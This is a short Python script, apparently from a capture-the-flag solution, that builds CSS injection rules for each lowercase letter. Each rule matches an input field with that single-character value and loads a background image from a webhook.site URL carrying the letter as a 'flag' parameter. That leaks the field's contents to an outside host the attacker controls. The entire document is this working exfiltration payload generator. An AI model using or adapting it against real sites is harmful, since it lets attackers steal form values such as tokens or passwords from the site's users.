import string

result = ""
for ch in string.ascii_lowercase:
    result += 'input[value="' + ch +'"] {background-image:url(https://webhook.site/6100aeb8-f1a4-481d-9027-8827d1c3b188?flag=' + ch + ');}'
print(result)